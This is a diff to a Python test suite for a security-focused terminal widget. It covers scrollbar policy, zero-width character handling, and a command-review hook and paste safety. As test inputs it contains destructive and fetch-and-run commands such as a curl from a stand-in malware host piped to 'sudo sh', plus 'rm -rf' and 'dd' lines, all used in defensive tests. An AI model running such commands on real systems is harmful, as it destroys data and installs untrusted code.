@@ -272,6 +272,28 @@ eq(_wmt.lineWrapMode(), _NW,
    'TUI grid never wraps (sized to fit; Detail/Reveal cells fall back to the box)')
 _wmt.close()
 
+# Horizontal scrollbar policy tracks the display mode: a TUI grid is a fixed
+# viewport-wide canvas (a real terminal never shows a horizontal bar on one), so
+# it is AlwaysOff; CLI keeps AsNeeded so a genuinely long NoWrap Box/Show line
+# stays reachable by a real scroll. Policy-only, so font-independent.
+from PyQt6.QtCore import Qt as _Qt                                 # noqa: E402
+_OFF = _Qt.ScrollBarPolicy.ScrollBarAlwaysOff
+_ASN = _Qt.ScrollBarPolicy.ScrollBarAsNeeded
+_sb = SecureTerminal(command='/bin/cat')                          # CLI
+eq(_sb.horizontalScrollBarPolicy(), _ASN,
+   'CLI mode keeps the horizontal scrollbar AsNeeded')
+_sb.apply_tui(True)
+eq(_sb.horizontalScrollBarPolicy(), _OFF,
+   'TUI grid suppresses the horizontal scrollbar (AlwaysOff)')
+_sb.apply_tui(False)
+eq(_sb.horizontalScrollBarPolicy(), _ASN,
+   'switching TUI->CLI restores the AsNeeded horizontal scrollbar')
+_sb.close()
+_sbt = SecureTerminal(command='/bin/cat', tui=True)
+eq(_sbt.horizontalScrollBarPolicy(), _OFF,
+   'a tab created in TUI mode starts with the horizontal scrollbar suppressed')
+_sbt.close()
+
 # alternate scroll: a full-screen program that did NOT request the mouse (a plain
 # pager in the alternate screen) has no local scrollback to move, so the wheel is
 # translated to arrow-key line scrolls (xterm's alternateScroll). A program that DID
@@ -963,6 +985,67 @@ if tui_available():
     ok(_S_zw.BOX in _zw2.document().toPlainText(),
        'a zero-width character at column 0 marks the previous row last cell')
     _zw2.close()
+
+    # _mark_own_cell only-mark-never-destroy at the screen origin. The origin is
+    # the one place draw() reaches _mark_own_cell (no preceding cell to merge
+    # into). Repositioning the cursor back onto an already-drawn origin cell then
+    # feeding a zero-width non-combining char (U+200D) must PRESERVE the cell's
+    # base character and merely mark it -- the pre-fix code overwrote the cell with
+    # just the invisible, destroying the drawn char. Cover all three arms.
+    from secure_terminal.terminal import _TUI_COMBINE_CAP as _CAP     # noqa: E402
+
+    # (a) MERGE/preserve (the security assertion): 'A' occupies (0,0), the cursor
+    # is homed back to (0,0) with CSI H, then U+200D arrives. The invisible is
+    # appended so the base char survives; the cell is no longer purely printable so
+    # tui_cell renders the box placeholder (marked, not silently dropped, and not
+    # overwritten).
+    _mo = SecureTerminal(command='/bin/cat', tui=True)
+    feed_output(_mo, b'A\x1b[H')                        # draw 'A' at (0,0), home the cursor
+    feed_output(_mo, '\u200d'.encode('utf-8'))          # zero-width joiner onto the occupied cell
+    pump(120)
+    _mocell = _mo._screen.buffer[0][0].data
+    ok(_mocell.startswith('A'),
+       'TUI origin merge: a zero-width char preserves the occupied origin cell base char '
+       '(never overwritten with just the invisible)')
+    ok('\u200d' in _mocell,
+       'TUI origin merge: the invisible is appended so the origin cell is marked')
+    ok(_S_zw.BOX in _mo.document().toPlainText(),
+       'TUI origin merge: the marked origin cell renders the box placeholder')
+    _mo.close()
+
+    # (b) CAP: the origin cell already holds a base plus the stream-safe maximum of
+    # combining marks (data longer than _TUI_COMBINE_CAP). A further zero-width
+    # char at the repositioned origin is DROPPED -- no unbounded growth, cursor not
+    # advanced -- so steering a flood back onto one cell cannot bypass the cap.
+    _mc = SecureTerminal(command='/bin/cat', tui=True)
+    feed_output(_mc, ('A' + '\u0301' * 40).encode('utf-8'))   # base + acute flood -> cell over the cap
+    feed_output(_mc, b'\x1b[H')                                # home onto the capped origin cell
+    pump(120)
+    _before = _mc._screen.buffer[0][0].data
+    ok(len(_before) > _CAP,
+       'TUI origin cap: the origin cell is over the combining cap before the extra mark')
+    feed_output(_mc, '\u200d'.encode('utf-8'))
+    pump(120)
+    _after = _mc._screen.buffer[0][0].data
+    ok(_after == _before,
+       'TUI origin cap: a zero-width char on an already-capped origin cell is dropped (no growth)')
+    ok(_mc._screen.cursor.x == 0,
+       'TUI origin cap: the cursor is not advanced when the extra invisible is dropped')
+    _mc.close()
+
+    # (c) EMPTY (pre-existing behavior preserved): a zero-width char on an EMPTY
+    # origin occupies its own cell and advances the cursor, so a leading invisible
+    # is marked rather than dropped.
+    _me = SecureTerminal(command='/bin/cat', tui=True)
+    feed_output(_me, '\u200d'.encode('utf-8'))
+    pump(120)
+    ok(_me._screen.buffer[0].get(0) is not None,
+       'TUI origin empty: a leading zero-width char occupies the empty origin cell')
+    ok(_me._screen.cursor.x == 1,
+       'TUI origin empty: the cursor advances past the newly occupied origin cell')
+    ok(_S_zw.BOX in _me.document().toPlainText(),
+       'TUI origin empty: the marked origin cell renders the box placeholder')
+    _me.close()
 
 # --- a tab closed right after opening is not "a program is still running" -----
 # has_foreground_program() returns True whenever the tty's foreground pgrp differs
@@ -2486,24 +2569,13 @@ _dbl = QMouseEvent(QEvent.Type.MouseButtonDblClick, QPointF(5, 5), QPointF(5, 5)
                    Qt.KeyboardModifier.NoModifier)
 ins.mouseDoubleClickEvent(_dbl)
 eq(_dc, [0x202E], 'double-click on a marking opens its inspection popup')
-# command hook: judge the typed line before Enter submits it. The terminal here
-# runs /bin/cat, which only echoes -- no typed string is ever executed.
-hk = SecureTerminal(command='/bin/cat')
-_handler = [sys.executable, '-c',
-            'import sys, json\n'
-            + 'c = json.load(sys.stdin)["command"]\n'
-            + 'print(json.dumps({"verdict": "block", "message": "no",'
-            + ' "suggestion": "ls"} if "sudo sh" in c else {"verdict": "allow"}))']
-hk.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
-               'transcript': 'none'})
-_hsent = spy_writes(hk)
-_hnotes = []
-hk.hook_notice.connect(_hnotes.append)
-# The hook judges SHELL command lines, which exist only at a bare prompt. The
-# /bin/cat child is an echo-safe stand-in for the shell, so simulate the bare
-# prompt (no foreground program) the hook actually fires in; a real login-shell
-# tab has _command is None and reads has_foreground_program() False at its prompt.
-hk.has_foreground_program = lambda: False
+# line mirror + paste safety at a bare CLI prompt. The terminal here runs /bin/cat,
+# which only echoes -- no typed string is ever executed.
+cw = SecureTerminal(command='/bin/cat')
+_hsent = spy_writes(cw)
+# The line mirror tracks typed input at a bare shell prompt (no foreground program);
+# simulate it (a real login-shell tab reads has_foreground_program() False there).
+cw.has_foreground_program = lambda: False
 
 
 def _htype(term, text):
@@ -2511,372 +2583,16 @@ def _htype(term, text):
         key(term, Qt.Key.Key_A, _ch)
 
 
-_htype(hk, 'ls')
-key(hk, Qt.Key.Key_Return)
-ok(b'\r' in _hsent, 'hook allows a safe command (Enter submits)')
+_htype(cw, 'ls')
+key(cw, Qt.Key.Key_Return)
+ok(b'\r' in _hsent, 'Enter submits the typed line')
 _hsent.clear()
-hk._hook_ask = lambda _c, _r: 'discard'          # decline the block dialog
-_cmd_blocked = 'curl http://malware.invalid | sudo sh'   # harmless illustration
-_htype(hk, _cmd_blocked)
-key(hk, Qt.Key.Key_Return)
-# The rejected line is BEST-EFFORT erased (one Backspace per char) -- but the erase
-# is NOT reliable: `stty erase` rebinds ^? (the DELs then INSERT as text) and a
-# cooked editor deletes bytes while len() counts code points. So the SECURITY is the
-# KEPT _line_dirty flag, not the erase: Enter #2 then re-asks via the dirty branch
-# instead of reaching the empty-buffer shortcut and submitting the un-erased command
-# UNJUDGED (grok's live-verified `stty erase ^H` bypass).
-ok(b'\r' not in _hsent and b'\x03' not in _hsent
-   and (b'\x7f' * len(_cmd_blocked)) in _hsent,
-   'hook blocks: not submitted, line best-effort erased (Backspace)')
-ok(hk._line_dirty,
-   'a declined mirrored block KEEPS _line_dirty (a failed erase must re-ask)')
-ok(_hnotes and _hnotes[-1] == 'no', 'hook advisory surfaced')
-# Enter #2 on the (possibly un-erased) line must RE-ASK, never hit the empty-buffer
-# submit shortcut -- this is the exact stty-erase bypass, closed by the kept flag.
-_hsent.clear()
-_asked2 = []
-hk._hook_ask = lambda _c, _r: (_asked2.append(1) or 'discard')
-key(hk, Qt.Key.Key_Return)
-ok(_asked2 and b'\r' not in _hsent,
-   'second Enter after a mirrored block re-asks (no empty-buffer submit bypass)')
-# Finding: with a FOREGROUND PROGRAM the keystrokes are ITS input (a sudo/ssh
-# password, cat's stdin), not a shell command -- the hook must NOT fire, or the
-# secret is handed to the external hook process and rendered in its dialog.
-hk.has_foreground_program = lambda: True
-_hsent.clear()
-_leaked = []
-hk._hook_ask = lambda _c, _r: (_leaked.append(_c) or 'discard')
-_htype(hk, 'hunter2')                             # a password at e.g. sudo's prompt
-key(hk, Qt.Key.Key_Return)
-ok(not _leaked and b'\r' in _hsent,
-   'a foreground program owns the line: hook skipped, keystrokes pass through')
-_hsent.clear()
-_leaked.clear()
-_htype(hk, 'hunter2')
-key(hk, Qt.Key.Key_J, mods=Qt.KeyboardModifier.ControlModifier)   # Ctrl+J accept-line
-ok(not _leaked, 'Ctrl+J accept-line under a foreground program also skips the hook')
-hk.has_foreground_program = lambda: False         # back to a bare prompt
-hk._line_buffer = ''
-hk._line_dirty = False
-# history recall desyncs the hook's view of the line, so it must FAIL SAFE (ask),
-# not judge a stale/empty buffer and wave a recalled command through.
-_hsent.clear()
-_asked = []
-hk._hook_ask = lambda _c, _r: (_asked.append(_r['message']) or 'discard')
-key(hk, Qt.Key.Key_Up)                 # recall from history -> buffer now stale
-ok(hk._line_dirty, 'a history/edit key marks the line unverifiable for the hook')
-key(hk, Qt.Key.Key_Return)
-# The content is UNKNOWN (recalled), so it cannot be counted-erased; SIGINT is the
-# only keymap-free cancel. It is best-effort (stty intr undef disarms it), so the
-# dirty flag STAYS set: a second Enter re-asks rather than submitting a line the
-# cancel may have left at the prompt.
-ok(_asked and b'\x03' in _hsent and b'\r' not in _hsent,
-   'edited line: hook asks and (on decline) cancels, never submits unjudged')
-ok(hk._line_dirty,
-   'a discarded unknown line stays dirty: a disarmed SIGINT must re-ask, not submit')
-_hsent.clear()
-_asked.clear()
-key(hk, Qt.Key.Key_Return)             # press Enter again on the (possibly retained) line
-ok(_asked and b'\r' not in _hsent,
-   'second Enter after an unknown-line discard re-asks (no silent bypass)')
-hk._hook_ask = lambda _c, _r: 'run'    # now explicitly run it to settle the state
-key(hk, Qt.Key.Key_Return)
-ok(not hk._line_dirty, 'an explicit Run settles the line and clears the flag')
-# defense-in-depth: the hook layer single-lines a suggestion upstream, but the
-# widget also strips CR/LF at the write site, so even a suggestion that somehow
-# carried a newline can never auto-submit.
-import secure_terminal.hook as _hookmod              # noqa: E402
-_real_evaluate = _hookmod.evaluate
-_hookmod.evaluate = lambda *a, **k: {
-    'verdict': 'block', 'message': '', 'suggestion': 'evil\ncmd\rtail'}
-try:
-    hk._hook_ask = lambda _c, _r: 'suggest'
-    _hsent.clear()
-    _htype(hk, 'x')
-    key(hk, Qt.Key.Key_Return)
-    _written = b''.join(_hsent)
-    ok(b'\n' not in _written and b'\r' not in _written,
-       'hook suggestion write strips CR/LF: a newline suggestion cannot auto-run')
-    eq(hk._line_buffer, 'evil cmd tail',
-       'the inserted suggestion is single-lined at the write site')
-finally:
-    _hookmod.evaluate = _real_evaluate
 
-# ctl-send-text ATOMIC multi-line review (task D1): a remote-control injection is a security
-# surface. A multi-line payload is judged as ONE script, ONCE, against the state at injection
-# time -- NOT line-by-line, which let line i be judged before line i-1 had executed (a `cd` /
-# `export` / `umask` on an earlier line moved the cwd/env/state the hook read for a later
-# line -- the stale-state TOCTOU this closes). A block on any part refuses the WHOLE batch
-# before anything is delivered (fails closed). (Finding: send-text judged `rm victim` under
-# the pre-`cd` cwd.)
-_inj = SecureTerminal(command='/bin/cat')
-_inj.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
-                 'transcript': 'none'})
-_inj.has_foreground_program = lambda: False
-_injs = spy_writes(_inj)
-_asked_inj = []
-_inj._hook_ask = lambda _c, _r: (_asked_inj.append(_c) or 'discard')   # decline the batch
-_inj._inject_text_reviewed('echo one\nx sudo sh\ntail')   # _handler blocks "sudo sh"
-_injoined = b''.join(_injs)
-ok(_asked_inj == ['echo one\nx sudo sh'],
-   'atomic review: the WHOLE script (every submitted line) is judged as one unit')
-ok(_injoined == b'',
-   'atomic review: a blocked batch delivers NOTHING -- fails closed before any line runs')
-ok(b'echo one\r' not in _injoined,
-   'atomic review: an earlier line never runs when a later line in the batch is blocked')
-ok(not _inj._line_dirty,
-   'atomic review: a batch refused before delivery leaves the prompt clean')
-# no hook configured -> falls back to the safe paste path (no per-line dialog)
-_inj2 = SecureTerminal(command='/bin/cat')
-_inj2.has_foreground_program = lambda: False
-_inj2s = spy_writes(_inj2)
-_inj2._inject_text_reviewed('ls\n')
-ok(_inj2s == [b'ls'] and _inj2._line_dirty,
-   'no-hook injection falls back to the paste path (sanitized, no auto-submit)')
-_inj.close()
-_inj2.close()
-
-# BYPASS (fixed): a command the prompt ALREADY holds, which the hook never judged, must
-# not be auto-submitted by an injected bare newline. The injection folds the pending line
-# into the judged command, so the hook sees (and here blocks) it. On 9ef8449 the loop
-# clobbered _line_buffer, the hook saw an EMPTY command (allowed), and the CR ran the
-# pending `sudo sh` UNREVIEWED.
-_injp = SecureTerminal(command='/bin/cat')
-_injp.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-_injp.has_foreground_program = lambda: False
-_injps = spy_writes(_injp)
-_asked_p = []
-_injp._hook_ask = lambda _c, _r: (_asked_p.append(_c) or 'discard')
-_injp._line_buffer = 'sudo sh'          # user typed it, no Enter yet (mirrored)
-_injp._line_dirty = False
-_injp._inject_text_reviewed('\n')       # a bare injected newline
-ok(_asked_p == ['sudo sh'],
-   'injection folds a pending typed line into the judged command (not an empty verdict)')
-ok(b'\r' not in b''.join(_injps),
-   'a pending typed line is never submitted by an injected bare newline')
-ok(_injp._line_dirty, 'a declined injected newline keeps the line dirty (re-ask)')
-_injp.close()
-
-# atomic refuse subsumes the old per-line "blank piece after a blocked line" concern: with
-# a whole-batch judge there is no un-erased leftover to submit. A blocked multi-line batch
-# is refused whole -- nothing typed, nothing submitted, the prompt left clean.
-_injb = SecureTerminal(command='/bin/cat')
-_injb.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-_injb.has_foreground_program = lambda: False
-_injbs = spy_writes(_injb)
-_injb._hook_ask = lambda _c, _r: 'discard'
-_injb._inject_text_reviewed('sudo sh\n\n')     # a blocked multi-line batch
-ok(b''.join(_injbs) == b'',
-   'atomic refuse: a blocked multi-line batch delivers nothing (no un-erased leftover)')
-ok(not _injb._line_dirty, 'a batch refused before delivery leaves the prompt clean')
-_injb.close()
-
-# an ASKED batch the user chooses to Run is delivered WHOLE: every submitted line reaches
-# the shell and the prompt settles. Under atomic review the whole script is judged once, so
-# a Run approves the entire batch (not line-by-line).
-_injr = SecureTerminal(command='/bin/cat')
-_injr.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-_injr.has_foreground_program = lambda: False
-_injrs = spy_writes(_injr)
-_injr._hook_ask = lambda _c, _r: 'run'
-_injr._inject_text_reviewed('sudo sh\nfree\n')   # first blocked-but-Run, second allowed
-_injrj = b''.join(_injrs)
-ok(b'sudo sh\r' in _injrj, 'an asked injected line chosen Run submits')
-ok(b'free\r' in _injrj, 'the injection continues to the next line after an approved Run')
-ok(not _injr._line_dirty, 'a clean run leaves the prompt settled')
-_injr.close()
-
-# BYPASS (fixed): an injection onto a line the hook CANNOT read (recalled/edited, so
-# _line_dirty) must not fold a stale prefix nor auto-submit -- the dirty branch ASKS. On
-# 9ef8449 the loop reset _line_dirty=False and ran the unmirrorable line unreviewed.
-_injd = SecureTerminal(command='/bin/cat')
-_injd.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-_injd.has_foreground_program = lambda: False
-_injds = spy_writes(_injd)
-_asked_d = []
-_injd._hook_ask = lambda _c, _r: (_asked_d.append(_c) or 'discard')
-_injd._line_dirty = True                 # a recalled/edited line, unmirrorable
-_injd._inject_text_reviewed('ls\n')
-ok(len(_asked_d) == 1 and b'\r' not in b''.join(_injds),
-   'an injected newline onto an unmirrorable line asks, never auto-submits')
-ok(_injd._line_dirty, 'the unmirrorable line stays dirty after a decline')
-_injd.close()
-
-# a partial injected line (no trailing newline) onto an already-dirty prompt is typed but
-# never submitted, and the prompt stays dirty for the user's own re-judged Enter.
-_injf = SecureTerminal(command='/bin/cat')
-_injf.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-_injf.has_foreground_program = lambda: False
-_injfs = spy_writes(_injf)
-_injf._line_dirty = True
-_injf._inject_text_reviewed('note')       # no newline: typed, never submitted
-ok(b'\r' not in b''.join(_injfs) and _injf._line_dirty,
-   'a partial injected line never auto-submits and keeps a dirty prompt dirty')
-_injf.close()
-
-# BYPASS (fixed): a Tab in an injected line triggers the shell's completion, so the
-# EXECUTED command differs from the literal bytes the hook judged (`ls\t` completes to a
-# different command). The line is marked unverifiable and the hook ASKS, never auto-runs.
-# On 9ef8449 the loop judged the pre-completion bytes and submitted the completed command.
-_injt = SecureTerminal(command='/bin/cat')
-_injt.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-_injt.has_foreground_program = lambda: False
-_injts = spy_writes(_injt)
-_asked_t = []
-_injt._hook_ask = lambda _c, _r: (_asked_t.append(_c) or 'discard')
-_injt._inject_text_reviewed('ls -l\t\n')     # a Tab in the line -> shell completion
-ok(len(_asked_t) == 1 and b'\r' not in b''.join(_injts),
-   'an injected line with a Tab is asked (unverifiable completion), never auto-submitted')
-_injt.close()
-
-# atomic TOCTOU canary: a multi-line injection judges the hook exactly ONCE, over the whole
-# script, at injection time -- never once per line. The per-line loop judged line i BEFORE
-# line i-1 had run, so a `cd` on an earlier line moved the cwd the hook read for a later
-# line. Recording evaluate() proves a single whole-script call (script=True). On the old
-# per-line code evaluate ran once PER LINE, so len(_recorded) was 2 -> this canary fails there.
-_real_eval2 = _hookmod.evaluate
-_recorded = []
-def _rec_eval(_argv, command, **kw):
-    _recorded.append((command, kw.get('script', False)))
-    return {'verdict': 'allow', 'message': '', 'suggestion': '', 'error': False}
-_hookmod.evaluate = _rec_eval
-try:
-    _tox = SecureTerminal(command='/bin/cat')
-    _tox.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-    _tox.has_foreground_program = lambda: False
-    _toxs = spy_writes(_tox)
-    _tox._inject_text_reviewed('cd /tmp\nrm victim\n')
-    ok(len(_recorded) == 1,
-       'atomic: a multi-line injection is judged ONCE, not per line (no stale-state TOCTOU)')
-    ok(_recorded and _recorded[0] == ('cd /tmp\nrm victim', True),
-       'atomic: the whole script is judged as one unit via the v2 script contract')
-    ok(b'cd /tmp\r' in b''.join(_toxs) and b'rm victim\r' in b''.join(_toxs),
-       'atomic: an allowed batch delivers and submits every line')
-    ok(not _tox._line_dirty, 'atomic: a fully-approved batch leaves the prompt settled')
-    _tox.close()
-    # an all-blank multi-line batch is UNVERIFIABLE: at a shell continuation prompt a blank
-    # line completes and runs the pending command, and the widget cannot see that state ->
-    # refuse, deliver nothing, no hook call (fail closed).
-    _recorded.clear()
-    _tobl = SecureTerminal(command='/bin/cat')
-    _tobl.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-    _tobl.has_foreground_program = lambda: False
-    _toblnotes = []
-    _tobl.hook_notice.connect(_toblnotes.append)
-    _tobls = spy_writes(_tobl)
-    _tobl._inject_text_reviewed('\n\n')
-    ok(_recorded == [] and b''.join(_tobls) == b''
-       and _toblnotes and 'could not be reviewed' in _toblnotes[-1],
-       'atomic: an all-blank batch is refused (a blank line may complete a continuation)')
-    _tobl.close()
-    # a trailing partial line (no final newline) is delivered but left at the prompt for the
-    # user's own re-judged Enter; only the submitted lines form the judged script.
-    _recorded.clear()
-    _toc = SecureTerminal(command='/bin/cat')
-    _toc.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-    _toc.has_foreground_program = lambda: False
-    _tocs = spy_writes(_toc)
-    _toc._inject_text_reviewed('one\ntwo\nthree')
-    _tocj = b''.join(_tocs)
-    ok(_recorded and _recorded[0][0] == 'one\ntwo',
-       'atomic: only the submitted lines form the judged script (trailing partial excluded)')
-    ok(b'one\r' in _tocj and b'two\r' in _tocj and b'three' in _tocj and b'three\r' not in _tocj,
-       'atomic: the trailing partial line is typed but never auto-submitted')
-    ok(_toc._line_dirty, 'atomic: the trailing partial waits at the prompt (unverifiable)')
-    _toc.close()
-finally:
-    _hookmod.evaluate = _real_eval2
-# atomic fails-closed: a hard block on the batch delivers NOTHING and surfaces the advisory.
-_hookmod.evaluate = lambda *a, **k: {'verdict': 'block', 'message': 'nope',
-                                     'suggestion': '', 'error': False}
-try:
-    _tob = SecureTerminal(command='/bin/cat')
-    _tob.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-    _tob.has_foreground_program = lambda: False
-    _tobnotes = []
-    _tob.hook_notice.connect(_tobnotes.append)
-    _tobs = spy_writes(_tob)
-    _tob._hook_ask = lambda _c, _r: 'discard'
-    _tob._inject_text_reviewed('cd /tmp\nrm victim\n')
-    ok(b''.join(_tobs) == b'' and not _tob._line_dirty,
-       'atomic: a blocked batch delivers nothing and leaves the prompt clean')
-    ok(_tobnotes and _tobnotes[-1] == 'nope', 'atomic: the block advisory is surfaced')
-    _tob.close()
-finally:
-    _hookmod.evaluate = _real_eval2
-# refuse WITHOUT any hook call: an unmirrorable prompt line, and a Tab in a submitted line
-# (completion would run other than the judged bytes), are each refused before judging --
-# nothing to faithfully review -- delivering nothing and surfacing a notice. _hook_ask is
-# mocked defensively so the refuse path is proven without a modal even if it were reached.
-_tod = SecureTerminal(command='/bin/cat')
-_tod.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-_tod.has_foreground_program = lambda: False
-_tod._hook_ask = lambda _c, _r: 'discard'
-_todnotes = []
-_tod.hook_notice.connect(_todnotes.append)
-_tods = spy_writes(_tod)
-_tod._line_dirty = True                      # a recalled/edited prompt line, unmirrorable
-_tod._inject_text_reviewed('cd /tmp\nrm victim\n')
-ok(b''.join(_tods) == b'' and _todnotes and 'could not be reviewed' in _todnotes[-1],
-   'atomic: a multi-line batch onto an unmirrorable line is refused whole, with a notice')
-_tod.close()
-_tot = SecureTerminal(command='/bin/cat')
-_tot.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-_tot.has_foreground_program = lambda: False
-_tot._hook_ask = lambda _c, _r: 'discard'
-_totnotes = []
-_tot.hook_notice.connect(_totnotes.append)
-_tots = spy_writes(_tot)
-_tot._inject_text_reviewed('ls\trm\nwhoami\n')   # a Tab in a submitted line
-ok(b''.join(_tots) == b'' and _totnotes and 'could not be reviewed' in _totnotes[-1],
-   'atomic: a Tab in a submitted line refuses the whole batch (completion is unjudgeable)')
-_tot.close()
-
-# v2 fail-closed at the widget (real hook.evaluate): a multi-line batch a VERSION-1 handler
-# ALLOWS -- one that does not set `multiline_reviewed` -- is refused whole. hook.evaluate
-# downgrades the unconfirmed allow to block (a v1 handler judges only the single-line
-# `command`, so a later dangerous line could slip past), so nothing is delivered. The real
-# per-line _handler allows a non-sudo batch but sets no ack, exercising the downgrade E2E.
-_tov1 = SecureTerminal(command='/bin/cat')
-_tov1.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-_tov1.has_foreground_program = lambda: False
-_tov1._hook_ask = lambda _c, _r: 'discard'
-_tov1notes = []
-_tov1.hook_notice.connect(_tov1notes.append)
-_tov1s = spy_writes(_tov1)
-_tov1._inject_text_reviewed('ls\nwhoami\n')       # v1 handler allows; no multiline ack
-ok(b''.join(_tov1s) == b'' and _tov1notes and 'multi-line review' in _tov1notes[-1],
-   'a v1-handler ALLOW on a multi-line batch is refused (no multiline_reviewed ack)')
-_tov1.close()
-
-# single-line injection keeps the per-line path (there is no multi-line stale-state window
-# for one submitted line): an allowed line submits, and a flagged line the user Runs submits
-# and lets the injection settle. (Only >=2 submitted lines take the atomic whole-script path.)
-_injs1 = SecureTerminal(command='/bin/cat')
-_injs1.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-_injs1.has_foreground_program = lambda: False
-_injs1w = spy_writes(_injs1)
-_injs1._inject_text_reviewed('ls\n')                    # a single allowed line
-ok(b'ls\r' in b''.join(_injs1w),
-   'single-line injection: an allowed line submits via the per-line path')
-_injs1.close()
-_injs2 = SecureTerminal(command='/bin/cat')
-_injs2.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
-_injs2.has_foreground_program = lambda: False
-_injs2w = spy_writes(_injs2)
-_injs2._hook_ask = lambda _c, _r: 'run'                 # approve the flagged single line
-_injs2._inject_text_reviewed('sudo sh\n')               # a single asked-then-Run line
-ok(b'sudo sh\r' in b''.join(_injs2w) and not _injs2._line_dirty,
-   'single-line injection: an asked line chosen Run submits and settles the prompt')
-_injs2.close()
-
-# Ctrl+\ (SIGQUIT): whether the tty flushes or RETAINS the pending line is tty/shell-dependent
-# (NOFLSH off flushes; `stty noflsh` or bash trapping SIGQUIT RETAINS it) and unobservable to
-# us. So the line is marked UNVERIFIABLE -- the next Enter must fail safe (re-ask/re-judge),
-# never auto-submit. Clearing the mirror to empty (the prior fix) let a RETAINED "safe"+typed
-# command run UNJUDGED on the next Enter (the noflsh empty-mirror bypass, cf. #34/#35).
+# Ctrl+\ (SIGQUIT): whether the tty flushes or RETAINS the pending line is tty/shell-
+# dependent (NOFLSH off flushes; `stty noflsh` or bash trapping SIGQUIT RETAINS it) and
+# unobservable to us. So the line is marked UNVERIFIABLE, keeping _line_pending() aware a
+# retained line may sit at the prompt (so a CR-terminated re-export is not typed onto it).
 _sq = SecureTerminal(command='/bin/cat')
-_sq.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow', 'transcript': 'none'})
 _sq.has_foreground_program = lambda: False
 _sqs = spy_writes(_sq)
 _htype(_sq, 'safe')
@@ -2885,14 +2601,157 @@ key(_sq, Qt.Key.Key_Backslash, mods=Qt.KeyboardModifier.ControlModifier)
 ok(b'\x1c' in b''.join(_sqs), 'Ctrl+\\ sends SIGQUIT (0x1c) to the child')
 ok(_sq._line_dirty,
    'Ctrl+\\ marks the line unverifiable (SIGQUIT may RETAIN the line under noflsh)')
-# the next Enter must re-ask via the dirty branch, never auto-submit a possibly-retained line
-_sqs.clear()
-_sqasked = []
-_sq._hook_ask = lambda _c, _r: (_sqasked.append(1) or 'discard')
-key(_sq, Qt.Key.Key_Return)
-ok(_sqasked and b'\r' not in b''.join(_sqs),
-   'the next Enter after Ctrl+\\ re-asks (dirty branch), never auto-submits a retained line')
 _sq.close()
+
+# desync fail-safe: Tab completion and readline control edits rewrite the shell's line
+# without updating _line_buffer, so the mirror is marked unverifiable -- _line_pending()
+# must then assume the prompt holds text it cannot see.
+_ctrl_mod = Qt.KeyboardModifier.ControlModifier
+cw._line_buffer = 'dd of=/dev/sd'
+cw._line_dirty = False
+key(cw, Qt.Key.Key_Tab, '\t')
+ok(cw._line_dirty, 'Tab completion marks the line unverifiable')
+cw._line_dirty = False
+key(cw, Qt.Key.Key_A, mods=_ctrl_mod)                # Ctrl+A: move-to-start (readline)
+ok(cw._line_dirty, 'a readline control edit (Ctrl+A) marks the line unverifiable')
+cw._line_dirty = False
+key(cw, Qt.Key.Key_BracketRight, '\x1d', mods=_ctrl_mod)   # generic control edit
+ok(cw._line_dirty, 'a generic control edit marks the line unverifiable')
+cw._line_dirty = False
+cw._line_buffer = 'x'
+key(cw, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U: full-line discard
+ok(not cw._line_dirty and cw._line_buffer == '',
+   'Ctrl+U discards the line and stays clean (nothing stale)')
+# Ctrl+U's reach is cursor-dependent (bash unix-line-discard kills only cursor-to-start),
+# so it must NOT clear an ALREADY-dirty flag: Home (dirty) then Ctrl+U can leave a survivor
+# in the shell, so _line_pending() must keep reporting the prompt as held.
+cw._line_buffer = 'rm -rf ~/important'
+cw._line_dirty = True                                # cursor moved (e.g. Home/Ctrl+A)
+key(cw, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U at a non-end cursor
+ok(cw._line_dirty,
+   'Ctrl+U after a cursor move STAYS dirty -- a survivor still reads as held')
+cw._line_dirty = False
+
+# paste can NEVER auto-execute. A SINGLE-line paste (with or without a trailing newline)
+# is delivered with its trailing submit stripped, so it lands at the prompt un-entered;
+# since _line_buffer never saw those bytes, the line is marked unverifiable (so
+# _line_pending() treats the prompt as held). A MULTI-line paste (a hidden second
+# command) is HELD for review first.
+from PyQt6.QtCore import QMimeData as _QMimePaste          # noqa: E402
+cw.apply_paste_warn('unicode')       # (reuse the _hsent spy set up above)
+_hsent.clear()
+cw._line_dirty = False
+_pmnl = _QMimePaste()
+_pmnl.setText('rm -rf /tmp/x\n')                     # single-line + trailing newline
+cw.insertFromMimeData(_pmnl)
+ok(not cw.review_pending(),
+   'a single-line paste is not held (it cannot auto-run once the submit is stripped)')
+eq(_hsent, [b'rm -rf /tmp/x'],
+   'a single-line paste reaches the shell WITHOUT its trailing submit -- no auto-run')
+ok(cw._line_dirty,
+   'a paste marks the line unverifiable (held for _line_pending)')
+_hsent.clear()
+cw._line_dirty = False
+_pmins = _QMimePaste()
+_pmins.setText('ls -la')                             # no newline: inserts into the line
+cw.insertFromMimeData(_pmins)
+ok(cw._line_dirty, 'a non-submitting paste marks the line dirty')
+_hsent.clear()
